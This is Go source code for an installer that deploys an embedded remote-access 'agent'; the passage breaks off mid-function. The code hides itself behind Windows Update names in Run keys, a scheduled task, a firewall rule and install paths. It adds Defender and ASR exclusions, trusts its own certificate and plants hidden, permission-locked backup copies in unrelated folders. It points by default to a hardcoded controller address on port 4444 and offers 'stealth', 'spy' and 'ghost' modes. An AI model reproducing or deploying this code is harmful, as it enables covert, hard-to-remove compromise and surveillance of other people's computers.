package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"rmm/internal/persist"
	"rmm/internal/version"
)

//go:embed payload/*
var payloadFS embed.FS

// hideWindow wraps an exec.Cmd so the child process never flashes a console.
func hideWindow(cmd *exec.Cmd) *exec.Cmd {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	return cmd
}

// hiddenExec is a shorthand for hideWindow(exec.Command(...)).
func hiddenExec(name string, args ...string) *exec.Cmd {
	return hideWindow(exec.Command(name, args...))
}

var procMessageBoxW = syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW")

// installSilent mirrors --silent for die() (popups only on visible runs).
var installSilent = false

// die is the loud exit: log file + (on visible runs) an error dialog,
// then code 1. Silent runs keep file-only behavior. Every fatal below
// funnels here so a dead installer can never again vanish without a word
// (v1.46.90: EXIT=1 with an empty log and no console, twice).
func die(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	log.Printf("FATAL: %s", msg)
	if !installSilent {
		t, _ := syscall.UTF16PtrFromString("Agent Setup")
		m, _ := syscall.UTF16PtrFromString(msg)
		procMessageBoxW.Call(0, uintptr(unsafe.Pointer(m)), uintptr(unsafe.Pointer(t)), 0x10)
	}
	os.Exit(1)
}

func isAdmin() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func relaunchAsAdmin() {
	// Verified handoff (v1.46.89): the old fire-and-forget exited 0 the
	// instant the UAC prompt APPEARED — approved, denied, or never seen
	// (secure desktop is invisible over screen streams), the CMD read
	// success either way. Now the parent waits up to 2min for the
	// elevated child to prove it runs, and exits NONZERO otherwise, so a
	// hung prompt reads as failure instead of "nothing happens".
	hs := elevatedHandshakePath()
	if hs == "" {
		shellExecuteRunas()
		os.Exit(0)
	}
	_ = os.Remove(hs)
	shellExecuteRunas()
	deadline := time.Now().Add(120 * time.Second)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(hs); err == nil {
			log.Printf("elevated child confirmed, handing off")
			os.Exit(0)
		}
		time.Sleep(time.Second)
	}
	die("elevation unapproved after 120s (UAC prompt unseen on secure desktop?) — approve on the box screen, or run from an elevated prompt; if approved late, the install may still complete, check version.txt")
}

// elevatedHandshakePath is the proof-of-life file the elevated child
// drops the moment it passes the admin check ("": no TEMP, unverifiable).
func elevatedHandshakePath() string {
	tmp := os.Getenv("TEMP")
	if tmp == "" {
		return ""
	}
	return filepath.Join(tmp, "rmm-elevated.ok")
}

// handshakeWait polls dir/marker until present or timeout. Pure seam for
// unit tests (the installer wires it to TEMP + 120s).
func handshakeWait(path string, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(path); err == nil {
			return true
		}
		time.Sleep(50 * time.Millisecond)
	}
	return false
}

// shellExecuteInfo mirrors SHELLEXECUTEINFOW for the runas call below.
type shellExecuteInfo struct {
	cbSize         uint32
	fMask          uint32
	hwnd           syscall.Handle
	lpVerb         *uint16
	lpFile         *uint16
	lpParameters   *uint16
	lpDirectory    *uint16
	nShow          int32
	hInstApp       syscall.Handle
	lpIDList       uintptr
	lpClass        *uint16
	hkeyClass      uintptr
	dwHotKey       uint32
	hIconOrMonitor syscall.Handle
	hProcess       syscall.Handle
}

const (
	seeMaskNoCloseProcess = 0x40
	seeMaskFlagNoUI       = 0x400
	swHide                = 0
)

// shellExecuteRunas re-launches ourselves elevated and FAILS LOUDLY when
// the request itself is denied (old code ignored the return entirely).
func shellExecuteRunas() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	params, _ := syscall.UTF16PtrFromString(strings.Join(os.Args[1:], " "))
	sei := shellExecuteInfo{fMask: seeMaskNoCloseProcess | seeMaskFlagNoUI, lpVerb: verb, lpFile: file, lpParameters: params, nShow: swHide}
	// cbSize must be set (forgotten once, ShellExecuteEx silently failed).
	sei.cbSize = uint32(unsafe.Sizeof(sei))
	mod := syscall.NewLazyDLL("shell32.dll")
	ret, _, _ := mod.NewProc("ShellExecuteExW").Call(uintptr(unsafe.Pointer(&sei)))
	if ret == 0 {
		die("elevation request rejected (UAC denied?) — run from an elevated prompt")
	}
}

// setupInstallLog tees every log line (including fatal aborts) into
// rmm-install.log alongside stderr. Best effort and silent about it:
// logging must never break an install. The handle stays open for the
// process lifetime (writes are unbuffered, nothing to flush). Tries user
// TEMP, then Windows\Temp, then ProgramData: one locked file must never
// blind us again (v1.46.90: the user-TEMP copy stayed 0 bytes while the
// installer died elsewhere).
func setupInstallLog() {
	// RMM_LOG_DIR overrides for tests (the NoTemp case must not spray
	// the real Windows\Temp from the suite).
	for _, dir := range []string{os.Getenv("RMM_LOG_DIR"), os.Getenv("TEMP"), `C:\Windows\Temp`, os.Getenv("ProgramData")} {
		if dir == "" {
			continue
		}
		if f, err := os.OpenFile(filepath.Join(dir, "rmm-install.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
			log.SetOutput(io.MultiWriter(os.Stderr, f))
			log.Printf("install log: %s", filepath.Join(dir, "rmm-install.log"))
			return
		}
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// agentProcsAlive reports whether any agent binary is still running.
// tasklist itself failing reads as alive (fail safe: retry the kill
// rather than assume the exe is unlocked).
func agentProcsAlive() bool {
	out, err := hiddenExec("tasklist", "/FI", "IMAGENAME eq MicrosoftWindowsClient.exe", "/FO", "CSV", "/NH").CombinedOutput()
	if err != nil {
		return true
	}
	return tasklistHasAgent(string(out))
}

// copyPayloadExe writes the agent binary with retries: AV scanners and
// dying husks briefly lock the file (v1.46.90: version.txt stamped new
// over an untouched old exe, then post-flight aborted). Verifies bytes
// every round; failure returns before stale bytes reach backups/vault.
func copyPayloadExe(dst string, payload []byte, rounds int) error {
	var err error
	for i := 0; i < rounds; i++ {
		if i > 0 {
			time.Sleep(3 * time.Second)
		}
		if werr := os.WriteFile(dst, payload, 0644); werr != nil {
			err = werr
			log.Printf("exe copy try %d: %v", i+1, werr)
			continue
		}
		if verr := checkFileSHA(dst, payload, "install exe"); verr != nil {
			err = verr
			log.Printf("exe copy try %d: %v", i+1, verr)
			continue
		}
		return nil
	}
	return err
}

// tasklistHasAgent parses tasklist CSV output for our binary. The quoted
// field match rejects lookalikes (e.g. .bak copies). Pure for unit tests.
func tasklistHasAgent(out string) bool {
	return strings.Contains(strings.ToLower(out), `"microsoftwindowsclient.exe"`)
}

// tasklistAgentPIDs extracts PIDs from tasklist CSV rows naming our exe.
// Pure for unit tests.
func tasklistAgentPIDs(out string) []int {
	var pids []int
	for _, line := range strings.Split(out, "\n") {
		if !strings.Contains(strings.ToLower(line), `"microsoftwindowsclient.exe"`) {
			continue
		}
		fields := strings.Split(line, `","`)
		if len(fields) >= 2 {
			if pid, err := strconv.Atoi(strings.Trim(fields[1], `"`)); err == nil && pid > 0 {
				pids = append(pids, pid)
			}
		}
	}
	return pids
}

// killResult classifies one per-PID taskkill outcome.
type killResult int

const (
	killDead killResult = iota // no instance / just terminated: gone
	killAlive                  // denied or other failure: still there
)

// classifyKillResult maps taskkill text to dead/alive. "SUCCESS" and
// "no running instance" both mean gone (the latter is tasklist racing a
// dying husk — exactly the 14-phantom case). Pure for unit tests.
func classifyKillResult(out string) killResult {
	s := strings.ToLower(out)
	if strings.Contains(s, "no running instance") || strings.Contains(s, "success:") || strings.Contains(s, "has been terminated") {
		return killDead
	}
	return killAlive
}

// auditDuplicates is the post-install accumulation tripwire (v1.46.92):
// a healthy box shows the fresh agent plus maybe one fading twin. More
// than two agent processes means the singleton is losing somewhere —
// warn LOUDLY in the log instead of letting the next 14 pile up silent.
func auditDuplicates() {
	out, _ := hiddenExec("tasklist", "/FI", "IMAGENAME eq MicrosoftWindowsClient.exe", "/FO", "CSV", "/NH").CombinedOutput()
	if n := len(tasklistAgentPIDs(string(out))); n > 2 {
		log.Printf("[!] %d agent processes running right after install — duplicates accumulating (healthy box shows one): investigate, do not ignore", n)
	}
}

// unkillableAgentPIDs returns listed PIDs that are actually still alive:
// each gets one targeted kill; phantoms ("no running instance") drop out.
// Non-empty = real survivors, abort the install.
func unkillableAgentPIDs() []int {
	out, _ := hiddenExec("tasklist", "/FI", "IMAGENAME eq MicrosoftWindowsClient.exe", "/FO", "CSV", "/NH").CombinedOutput()
	var live []int
	for _, pid := range tasklistAgentPIDs(string(out)) {
		ko, _ := hiddenExec("taskkill", "/F", "/PID", strconv.Itoa(pid)).CombinedOutput()
		if classifyKillResult(string(ko)) == killAlive {
			live = append(live, pid)
		}
	}
	return live
}

// staleSweepFiles are install-dir entries that must never survive into a
// fresh install (see the sweep above). Pure for unit tests.
func staleSweepFiles() []string {
	return []string{"agent.lock", "delete_pending.json", "delete_pending.json.active"}
}

// verifyFileSHA compares a written file against expected bytes. Every
// installer write below is silent on failure — this is the backstop
// that turns a no-op install into a loud nonzero exit instead.
func checkFileSHA(path string, want []byte, what string) error {
	got, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("verify %s: %s: %v", what, path, err)
	}
	sumGot := sha256.Sum256(got)
	sumWant := sha256.Sum256(want)
	if sumGot != sumWant {
		return fmt.Errorf("verify %s: %s bytes differ from payload (short/legacy write?)", what, path)
	}
	return nil
}

func checkVersionFile(dir, want, what string) error {
	b, err := os.ReadFile(filepath.Join(dir, "version.txt"))
	if err != nil || strings.TrimSpace(string(b)) != want {
		return fmt.Errorf("verify %s: version.txt missing or not %q", what, want)
	}
	return nil
}

func verifyFileSHA(path string, want []byte, what string) {
	if err := checkFileSHA(path, want, what); err != nil {
		die("%v", err)
	}
}

func verifyVersionFile(dir, want, what string) {
	if err := checkVersionFile(dir, want, what); err != nil {
		die("%v", err)
	}
}

// hideFile sets hidden+system attributes so the backup survives casual
// browsing and naive delete sweeps. Best effort; failures are ignored.
func hideFile(path string) {
	_, _ = hiddenExec("attrib", "+h", "+s", path).CombinedOutput()
}

// trustPublisherCert installs our code-signing cert into TrustedPublisher
// so SmartScreen/Smart App Control accept our signed binaries instead of
// blocking them as "unknown publisher". Needs admin (we have it).
func trustPublisherCert(dir string) {
	cer := filepath.Join(dir, "RMM.cer")
	if _, err := os.Stat(cer); err != nil {
		log.Printf("[!] publisher cert missing, SmartScreen may warn")
		return
	}
	out, err := hiddenExec("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput()
	if err != nil {
		log.Printf("[!] trust publisher cert: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Publisher cert trusted")
}

// addDefenderExclusions keeps Defender from quarantining our install dir +
// exe (heuristic false positives on admin tools), lets Controlled Folder
// Access writes through, and scopes ASR exclusions to our own paths.
// Best effort: fails silently when Defender is absent, managed, or Tamper
// Protection blocks it (then the friend allows it once in Protection history).
func addDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -AttackSurfaceReductionOnlyExclusions '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ControlledFolderAccessAllowedApplications '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

func removeDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -AttackSurfaceReductionOnlyExclusions '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ControlledFolderAccessAllowedApplications '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

// grantUsersModify lets a standard-user agent swap its own exe during
// self-update (rename needs modify rights on the dir). Best effort:
// logs and continues when icacls is unavailable.
func grantUsersModify(dirs ...string) {
	for _, d := range dirs {
		if d == "" {
			continue
		}
		out, err := hiddenExec("icacls", d, "/grant", "*S-1-5-32-545:(OI)(CI)M", "/T", "/C", "/Q").CombinedOutput()
		if err != nil {
			log.Printf("[!] icacls %s: %v %s", d, err, strings.TrimSpace(string(out)))
			continue
		}
		log.Printf("[*] Users modify granted on %s", d)
	}
}

// vaultDir is the fourth backup copy, inside the SYSTEM profile. Same path
// the agent's watcher reads (duplicated: installer and agent are separate
// binaries that must agree without sharing code).
func vaultDir() string {
	sys := os.Getenv("SystemRoot")
	if sys == "" {
		sys = `C:\Windows`
	}
	return filepath.Join(sys, "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "UpdateOrchestrator")
}

// lockVault strips inheritance and grants only SYSTEM + Administrators, so
// standard-user wipes and profile sweeps cannot reach the last-resort copy.
func lockVault(dir string) {
	out, err := hiddenExec("icacls", dir, "/inheritance:r", "/grant", "SYSTEM:(OI)(CI)F", "/grant", "*S-1-5-32-544:(OI)(CI)F", "/C", "/Q").CombinedOutput()
	if err != nil {
		log.Printf("[!] vault lock %s: %v %s", dir, err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Vault locked to SYSTEM+Administrators: %s", dir)
}

// sha256File returns the hex SHA256 of a file ("" on any error).
func sha256File(path string) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return ""
	}
	return hex.EncodeToString(h.Sum(nil))
}

// writeIntegrityManifest stamps dir/integrity.json {version, exe sha256}.
// The agent's healers verify it before restoring, refusing trojaned bytes.
func writeIntegrityManifest(dir, ver, exePath string) {
	sha := sha256File(exePath)
	if sha == "" || ver == "" {
		return
	}
	_ = os.WriteFile(filepath.Join(dir, "integrity.json"), []byte(`{"v":`+strconv.Quote(ver)+`,"sha":`+strconv.Quote(sha)+`}`+"\n"), 0644)
}

func saveHouse(path, addr string) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return
	}
	seen := map[string]bool{addr: true}
	houses := []string{addr + "\n"}
	if b, err := os.ReadFile(path); err == nil {
		for _, ln := range strings.Split(string(b), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") || seen[ln] {
				continue
			}
			seen[ln] = true
			houses = append(houses, ln+"\n")
		}
	}
	_ = os.WriteFile(path, []byte(strings.Join(houses, "")), 0644)
}

func install() {
	silent := false
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" {
			silent = true
			installSilent = true
		}
	}
	// Run log (v1.46.80 post-mortem): silent installs show nothing, so a
	// failed run was indistinguishable from a stale box. Every log line now
	// also appends to %TEMP%\rmm-install.log (SYSTEM context: the Windows
	// temp dir) — "still old after the CMD" starts with that file's tail.
	setupInstallLog()
	log.Printf("install start args=%q", os.Args)
	if !isAdmin() {
		log.Printf("not admin - relaunching elevated")
		relaunchAsAdmin()
		return
	}
	// Proof-of-life for the unelevated parent waiting on the handshake
	// (every entry point passes here: install + uninstall).
	if hs := elevatedHandshakePath(); hs != "" {
		_ = os.WriteFile(hs, []byte("elevated"), 0644)
	}

	// Bland machine-wide home (hidden system dir) instead of a branded
	// Program Files folder.
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
	_ = os.MkdirAll(installDir, 0755)

	_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
	_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
	// Legacy powershell watchdogs are extinct as of v1.40.9 (native --watch
	// mode); kill any left running.
	_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
	time.Sleep(1500 * time.Millisecond)
	// Kill-verify (v1.46.51 post-mortem): taskkill is fire-and-forget,
	// and a survivor holds the exe locked — every write below then fails
	// silently and the old version keeps running behind an exit-0
	// install. Retry, then abort LOUDLY (box keeps the old version,
	// operator retries/reboots) instead of corrupting forward.
	for i := 0; i < 3 && agentProcsAlive(); i++ {
		_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
		_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
		time.Sleep(2000 * time.Millisecond)
	}
	if agentProcsAlive() {
		// Phantom tolerance (v1.46.90): tasklist snapshots dying husks
		// that taskkill then reports as "no running instance" — 14 such
		// phantoms blocked one box. Confirm per-PID; abort only on
		// processes that are actually still killable-alive.
		if live := unkillableAgentPIDs(); len(live) > 0 {
			die("agent processes survive forced kill (pids %v) - aborting install (old version left running intact)", live)
		}
		log.Printf("tasklist showed stale entries only (phantom pids, nothing alive), proceeding")
	}
	// Fresh-start sweep (v1.46.88): zero agent processes are alive past
	// the kill-verify above, so lock + pending flags are definitionally
	// stale. A leftover delete_pending would teardown this install on its
	// first elevated run; a stale agent.lock (dead pid or pre-kill remnant)
	// wedges startup behind the singleton. Sweep them before writing.
	for _, stale := range staleSweepFiles() {
		if err := os.Remove(filepath.Join(installDir, stale)); err == nil {
			log.Printf("swept stale %s", stale)
		}
	}
	// Payload bytes up front (v1.46.51 post-mortem): the walk below
	// swallows read errors, which would "install" empty files behind an
	// exit-0. No payload = no install, loudly.
	payloadExe, err := fs.ReadFile(payloadFS, "payload/MicrosoftWindowsClient.exe")
	if err != nil || len(payloadExe) == 0 {
		die("embedded agent payload unreadable: %v", err)
	}
	// Previous version for the update claim (best effort): lets the
	// watcher tell this verified install from a trojan swap later.
	prevVer := ""
	if b, err := os.ReadFile(filepath.Join(installDir, "version.txt")); err == nil {
		prevVer = strings.TrimSpace(string(b))
	}

	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true, "agent.exe": true}
	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel("payload", path)
		if skip[strings.ToLower(filepath.Base(rel))] {
			return nil
		}
		dest := filepath.Join(installDir, rel)
		_ = os.MkdirAll(filepath.Dir(dest), 0755)
		data, _ := fs.ReadFile(payloadFS, path)
		_ = os.WriteFile(dest, data, 0644)
		return nil
	})

	agentPath := filepath.Join(installDir, "MicrosoftWindowsClient.exe")
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		_ = filepath.Walk(installDir, func(p string, info os.FileInfo, err error) error {
			if err == nil && strings.EqualFold(filepath.Base(p), "MicrosoftWindowsClient.exe") {
				agentPath = p
			}
			return nil
		})
	}
	_ = os.Remove(filepath.Join(installDir, "agent.exe"))

	// Exe first, verified, before anything copies from it: backups and
	// vault below are cloned from agentPath, so a locked write here
	// would poison every slot (v1.46.90 post-mortem).
	if err := copyPayloadExe(agentPath, payloadExe, 3); err != nil {
		die("install exe unwritable after retries: %v", err)
	}

	certPath := filepath.Join(installDir, "server.crt")

	controllerAddr := "176.229.98.54:4444"
	agentToken := ""
	agentModeFlag := ""
	deleteTokenFlag := ""
	for i, a := range os.Args {
		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
			controllerAddr = os.Args[i+1]
		} else if strings.HasPrefix(a, "-controller=") {
			controllerAddr = strings.TrimPrefix(a, "-controller=")
		} else if strings.HasPrefix(a, "--controller=") {
			controllerAddr = strings.TrimPrefix(a, "--controller=")
		} else if (a == "-token" || a == "--token") && i+1 < len(os.Args) {
			agentToken = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
		} else if strings.HasPrefix(a, "--token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
		} else if (a == "-deletetoken" || a == "--deletetoken") && i+1 < len(os.Args) {
			deleteTokenFlag = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-deletetoken=") {
			deleteTokenFlag = strings.TrimSpace(strings.TrimPrefix(a, "-deletetoken="))
		} else if strings.HasPrefix(a, "--deletetoken=") {
			deleteTokenFlag = strings.TrimSpace(strings.TrimPrefix(a, "--deletetoken="))
		} else if (a == "-mode" || a == "--mode") && i+1 < len(os.Args) {
			agentModeFlag = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-mode=") {
			agentModeFlag = strings.TrimSpace(strings.TrimPrefix(a, "-mode="))
		} else if strings.HasPrefix(a, "--mode=") {
			agentModeFlag = strings.TrimSpace(strings.TrimPrefix(a, "--mode="))
		}
	}
	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
	saveHouse(filepath.Join(installDir, "houses.txt"), controllerAddr)
	// Registration token: lets the controller tell managed agents apart
	// from rogue ones (empty = untokened, accepted unless enforced).
	tokenPath := filepath.Join(installDir, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(tokenPath, []byte(agentToken+"\n"), 0600)
		log.Printf("[*] Agent registration token stored")
	}
	// Operation mode (v1.42.3): persisted to mode.json so it survives
	// reboots/updates. Roster duplicated from internal/commands/mode.go
	// (keep in sync) to avoid pulling agent deps into the installer.
	if agentModeFlag != "" {
		validModes := []string{"normal", "stealth", "spy", "ghost", "performance", "kiosk", "audit"}
		ok := false
		for _, v := range validModes {
			if strings.EqualFold(agentModeFlag, v) {
				agentModeFlag = v
				ok = true
				break
			}
		}
		if !ok {
			die("unknown -mode %q (valid: %s)", agentModeFlag, strings.Join(validModes, ", "))
		}
		_ = os.WriteFile(filepath.Join(installDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
		log.Printf("[*] Agent operation mode stored: %s", agentModeFlag)
	}

	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)

	// HKCU may fail when installer runs elevated - not critical
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdate", cmdLine); err != nil {
			log.Printf("[!] HKCU WindowsUpdate Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
		log.Printf("[*] HKLM WindowsUpdate Run key set")
	}

	// Stale-task sweep: detect legacy task pointing to pre-rename agent.exe.
	// schtasks /query /v reports the Task To Run value; if it mentions the
	// old name we log it explicitly so field techs can confirm the heal.
	if out, err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
		for _, ln := range strings.Split(string(out), "\n") {
			if strings.Contains(strings.ToLower(ln), "agent.exe") && !strings.Contains(strings.ToLower(ln), "microsoftwindowsclient") {
				log.Printf("[*] Stale task detected (points to old agent.exe), will replace: %s", strings.TrimSpace(ln))
				break
			}
		}
	} else {
		log.Printf("[*] No existing WindowsUpdate task (fresh install)")
	}
	_, _ = hiddenExec("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()

	taskXML := persist.AgentTaskXML(agentPath, controllerAddr, certPath)

	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
	if out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
		log.Printf("[!] Failed to create WindowsUpdate task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] WindowsUpdate task registered -> %s", agentPath)
	}
	_ = os.Remove(tmpTask)
	// Delete any legacy watchdog task before recreating below, so a stale
	// entry can never overlap with the new one.
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()

	_, _ = hiddenExec("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()

	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
	// ask Defender to leave our dir/exe alone (heuristic false positives).
	trustPublisherCert(installDir)
	addDefenderExclusions(installDir, agentPath)
	// Self-update-friendly ACL: the agent often runs as a standard user
	// while the installer runs admin, leaving an admin-owned dir the agent
	// cannot swap its own exe in (rename = Access denied). Grant Users
	// modify (well-known SID, locale-proof) so future self-updates swap
	// directly; boxes installed before this still converge via staged
	// updates applied by the elevated watcher/WMI/service.
	grantUsersModify(installDir)

	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	blenderDir := filepath.Join(threeDObjects, "blender")
	_ = os.MkdirAll(blenderDir, 0755)
	// Second backup location: if one backup dir is wiped, the other still
	// heals the agent. Ordinary-looking system-ish path, hidden+system.
	backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
	if os.Getenv("APPDATA") == "" {
		backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
	}
	_ = os.MkdirAll(backupDir2, 0755)
	// Save the task XML next to the backup AND in the install dir (the
	// WMI consumer runs as SYSTEM and can only rely on the install dir).
	_ = os.WriteFile(filepath.Join(blenderDir, "agent_task.xml"), []byte(taskXML), 0644)
	_ = os.WriteFile(filepath.Join(installDir, "agent_task.xml"), []byte(taskXML), 0644)

	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
	backupCert := filepath.Join(blenderDir, "server.crt")
	_ = copyFile(agentPath, backupAgent)
	_ = copyFile(certPath, backupCert)
	backupAgent2 := filepath.Join(backupDir2, "MicrosoftWindowsClient.exe")
	backupCert2 := filepath.Join(backupDir2, "server.crt")
	_ = copyFile(agentPath, backupAgent2)
	_ = copyFile(certPath, backupCert2)
	grantUsersModify(blenderDir, backupDir2)
	// Self-delete token: guards permanent removal (kill-agent is only
	// quiet). Explicit flag wins; otherwise keep an existing one from any
	// copy; otherwise generate. Stored 0600 in install dir + both backups
	// + vault (travels like token.txt). Never logged.
	deleteTokenPath := filepath.Join(installDir, "delete_token.txt")
	deleteToken := deleteTokenFlag
	if deleteToken != "" && len(deleteToken) < 8 {
		die("delete token must be 8+ characters")
	}
	if deleteToken == "" {
		for _, p := range []string{deleteTokenPath, filepath.Join(blenderDir, "delete_token.txt"), filepath.Join(backupDir2, "delete_token.txt")} {
			if b, err := os.ReadFile(p); err == nil && len(bytes.TrimSpace(b)) >= 8 {
				deleteToken = string(bytes.TrimSpace(b))
				break
			}
		}
	}
	if deleteToken == "" {
		var rb [24]byte
		if _, err := rand.Read(rb[:]); err != nil {
			die("cannot generate delete token: %v", err)
		}
		deleteToken = hex.EncodeToString(rb[:])
		log.Printf("[*] Generated self-delete token (store it � removal needs it)")
	}
	_ = os.WriteFile(deleteTokenPath, []byte(deleteToken+"\n"), 0600)
	_ = os.WriteFile(filepath.Join(blenderDir, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
	_ = os.WriteFile(filepath.Join(backupDir2, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
	// Token travels with the backups (only when set - never create empties).
	backupToken := filepath.Join(blenderDir, "token.txt")
	backupToken2 := filepath.Join(backupDir2, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(backupToken, []byte(agentToken+"\n"), 0600)
		_ = os.WriteFile(backupToken2, []byte(agentToken+"\n"), 0600)
	} else {
		// Keep a previously-issued token across reinstalls that omit -token.
		if b, err := os.ReadFile(backupToken); err == nil && len(bytes.TrimSpace(b)) > 0 {
			_ = os.WriteFile(tokenPath, b, 0600)
			_ = os.WriteFile(backupToken2, b, 0600)
			log.Printf("[*] Kept existing registration token from backup")
		}
	}
	// Mode travels with the backups (only when set - never create empties).
	if agentModeFlag != "" {
		_ = os.WriteFile(filepath.Join(blenderDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
		_ = os.WriteFile(filepath.Join(backupDir2, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
	} else {
		// Keep a previously-set mode across reinstalls that omit -mode.
